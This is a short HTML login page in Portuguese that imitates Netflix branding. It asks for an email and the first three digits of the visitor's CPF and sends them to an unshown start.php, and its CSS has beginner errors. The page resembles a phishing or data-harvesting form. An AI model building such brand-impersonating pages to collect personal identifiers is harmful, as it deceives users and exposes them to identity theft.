<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Netflix</title>
    <style>

      @import url('https://fonts.googleapis.com/css2?family=Roboto+Slab:wght@500&display=swap');

        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: black;
        }

       h2 {
        font-family: 'Roboto Slab', sans-serif;
        font-weight: 300; 
        color: black;
       }
        .login-container {
            background-color: white; 
            padding: 20px;
            border-radius: 10px;
            text-align: center;
        }

    
        form {
            width: 300px;
            margin: 5px 0px;
            padding: 20px;
            color: white;
            text-align: center;
            
           
        }

        form input[type="text"],
        form input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid grey; 
            border-radius: 5px;
            width: 100%;
            border: 1px solid #ccc;
            border-radius: 5px;
        }

        form button {
            width: 100%;
            padding: 10px;
            background-color: #e50914; 
            border: none;
            border-radius: 5px;
            color: black;
            font-weight: bold;
            cursor: pointer;

        form genero {
          position: left;
        }
        }
        
    </style>
</head>
<body>
  <style>
    body {
      background-image: url("https://t.ctcdn.com.br/xzJNU6tuo-MVcwFd3yxx52bkURs=/768x432/smart/i576969.png");
      background-repeat: none;
      width
    }
  </style>
    <div class="login-container">
    
        <h2>Cadastro</h2>
        <form method="POST" action="start.php">
            <label for="email">Email:</label>
            <input type="text" id="email" name="email" required placeholder="Digite seu email:">
            <label for="senha">Senha (3 primeiros dígitos do CPF):</label>
            <input type="password" id="senha" name="senha" required placeholder="3 primeiros digitos do cpf">
            <button type="submit">Entrar</button>
        </form>
    </div>
</body>
</html>